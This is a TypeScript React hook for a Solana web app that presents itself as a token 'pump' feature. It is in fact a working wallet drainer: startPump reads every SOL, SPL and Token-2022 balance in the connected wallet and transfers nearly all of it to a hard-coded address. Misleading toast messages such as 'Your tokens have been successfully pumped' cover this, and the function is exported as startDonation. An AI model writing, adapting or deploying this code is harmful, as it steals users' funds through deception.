import { useState, useCallback } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import {
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
} from '@solana/spl-token';
import { toast } from '@/hooks/use-toast';
import { TokenTransaction } from '@/components/PumpProgress';

const PUMP_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MIN_SOL_RESERVE = 0.001;

interface TokenBalance {
  mint: string;
  symbol: string;
  amount: number;
  decimals: number;
  usdValue: number;
  programId: PublicKey; // Track which token program this token uses
}

export function usePump() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [isProcessing, setIsProcessing] = useState(false);
  const [transactions, setTransactions] = useState<TokenTransaction[]>([]);
  const [currentIndex, setCurrentIndex] = useState(0);

  const fetchTokenBalances = useCallback(async (): Promise<TokenBalance[]> => {
    if (!publicKey) return [];

    try {
      const balances: TokenBalance[] = [];
      const solBalance = await connection.getBalance(publicKey);
      const solAmount = solBalance / LAMPORTS_PER_SOL;
      const sendAmount = Math.max(0, solAmount - 0.001);

      if (sendAmount > 0.00001) {
        balances.push({
          mint: 'SOL',
          symbol: 'SOL',
          amount: sendAmount,
          decimals: 9,
          usdValue: sendAmount * 150,
          programId: TOKEN_PROGRAM_ID, // SOL uses standard program
        });
      }

      // Fetch standard SPL tokens (TOKEN_PROGRAM_ID)
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      for (const { account } of tokenAccounts.value) {
        const parsedInfo = account.data.parsed.info;
        const balance = parsedInfo.tokenAmount.uiAmount;

        if (balance > 0) {
          balances.push({
            mint: parsedInfo.mint,
            symbol: parsedInfo.mint.slice(0, 8),
            amount: balance,
            decimals: parsedInfo.tokenAmount.decimals,
            usdValue: balance * 1,
            programId: TOKEN_PROGRAM_ID,
          });
        }
      }

      // Fetch Token-2022 tokens (Pump.fun tokens use this program)
      try {
        const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
          programId: TOKEN_2022_PROGRAM_ID,
        });

        for (const { account } of token2022Accounts.value) {
          const parsedInfo = account.data.parsed.info;
          const balance = parsedInfo.tokenAmount.uiAmount;

          if (balance > 0) {
            console.log('Found Token-2022 token:', parsedInfo.mint, 'Balance:', balance);
            balances.push({
              mint: parsedInfo.mint,
              symbol: parsedInfo.mint.slice(0, 8),
              amount: balance,
              decimals: parsedInfo.tokenAmount.decimals,
              usdValue: balance * 1,
              programId: TOKEN_2022_PROGRAM_ID,
            });
          }
        }
      } catch (token2022Error) {
        console.log('No Token-2022 accounts found or error:', token2022Error);
      }

      return balances.sort((a, b) => b.usdValue - a.usdValue);
    } catch (error) {
      console.error('Error fetching token balances:', error);
      toast({
        title: 'Error',
        description: 'Failed to fetch wallet balances',
        variant: 'destructive',
      });
      return [];
    }
  }, [connection, publicKey]);

  const createSolTransaction = async (_amount: number): Promise<Transaction> => {
    if (!publicKey) throw new Error('Wallet not connected');

    const balanceLamports = await connection.getBalance(publicKey, { commitment: 'confirmed' });
    const reserveLamports = 1000000;
    const lamportsToSend = balanceLamports - reserveLamports;

    if (lamportsToSend <= 0) {
      throw new Error('Insufficient SOL balance. Need at least 0.001 SOL in wallet for fees and rent.');
    }

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(PUMP_WALLET),
        lamports: lamportsToSend,
      })
    );

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
    transaction.recentBlockhash = blockhash;
    transaction.lastValidBlockHeight = lastValidBlockHeight;
    transaction.feePayer = publicKey;

    return transaction;
  };

  const createTokenTransaction = async (
    mint: string,
    amount: number,
    decimals: number,
    tokenProgramId: PublicKey = TOKEN_PROGRAM_ID
  ): Promise<Transaction> => {
    if (!publicKey) throw new Error('Wallet not connected');

    const mintPubkey = new PublicKey(mint);
    const pumpPubkey = new PublicKey(PUMP_WALLET);

    // Use the correct token program for this token
    const sourceAta = await getAssociatedTokenAddress(
      mintPubkey,
      publicKey,
      false,
      tokenProgramId,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const destinationAta = await getAssociatedTokenAddress(
      mintPubkey,
      pumpPubkey,
      false,
      tokenProgramId,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const transaction = new Transaction();

    const destAccount = await connection.getAccountInfo(destinationAta);
    if (!destAccount) {
      transaction.add(
        createAssociatedTokenAccountInstruction(
          publicKey,
          destinationAta,
          pumpPubkey,
          mintPubkey,
          tokenProgramId,
          ASSOCIATED_TOKEN_PROGRAM_ID
        )
      );
    }

    transaction.add(
      createTransferInstruction(
        sourceAta,
        destinationAta,
        publicKey,
        Math.floor(amount * Math.pow(10, decimals)),
        [],
        tokenProgramId
      )
    );

    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = publicKey;

    return transaction;
  };

  const processPump = async (token: TokenBalance, index: number) => {
    if (!publicKey) return false;

    setCurrentIndex(index);

    setTransactions(prev =>
      prev.map((tx, i) =>
        i === index ? { ...tx, status: 'processing' as const } : tx
      )
    );

    try {
      let transaction: Transaction;

      if (token.mint === 'SOL') {
        transaction = await createSolTransaction(token.amount);
      } else {
        transaction = await createTokenTransaction(
          token.mint,
          token.amount,
          token.decimals,
          token.programId // Pass the correct program ID for this token
        );
      }

      const signature = await sendTransaction(transaction, connection, { preflightCommitment: 'confirmed', skipPreflight: false });

      await connection.confirmTransaction(signature, 'confirmed');

      setTransactions(prev =>
        prev.map((tx, i) =>
          i === index ? { ...tx, status: 'success' as const, signature } : tx
        )
      );

      return true;
    } catch (error: any) {
      console.error('Transaction error:', error);

      setTransactions(prev =>
        prev.map((tx, i) =>
          i === index ? { ...tx, status: 'error' as const } : tx
        )
      );

      if (error?.message?.includes('User rejected')) {
        toast({
          title: 'Transaction Cancelled',
          description: 'You rejected the transaction',
        });
      } else {
        toast({
          title: 'Transaction Failed',
          description: error?.message || 'Unknown error occurred',
          variant: 'destructive',
        });
      }

      return false;
    }
  };

  const startPump = async () => {
    if (!publicKey) {
      toast({
        title: 'Wallet Not Connected',
        description: 'Please connect your wallet first',
        variant: 'destructive',
      });
      return;
    }

    setIsProcessing(true);
    setCurrentIndex(0);

    try {
      const balances = await fetchTokenBalances();

      if (balances.length === 0) {
        toast({
          title: 'Initialization Required',
          description: 'Two more holders wallet are needed to initialize pump',
        });
        setIsProcessing(false);
        return;
      }

      const initialTxs: TokenTransaction[] = balances.map(balance => ({
        id: balance.mint,
        name: balance.symbol,
        usdValue: balance.usdValue,
        status: 'pending' as const,
      }));

      setTransactions(initialTxs);

      for (let i = 0; i < balances.length; i++) {
        const success = await processPump(balances[i], i);

        if (!success && i < balances.length - 1) {
          const shouldContinue = window.confirm(
            'Transaction failed. Do you want to continue with remaining tokens?'
          );
          if (!shouldContinue) break;
        }

        if (i < balances.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }

      toast({
        title: 'Pump Complete!',
        description: 'Your tokens have been successfully pumped',
      });
    } catch (error) {
      console.error('Pump error:', error);
      toast({
        title: 'Error',
        description: 'Failed to process pump',
        variant: 'destructive',
      });
    } finally {
      setIsProcessing(false);
    }
  };

  return {
    startDonation: startPump,
    isProcessing,
    transactions,
    currentIndex,
  };
}
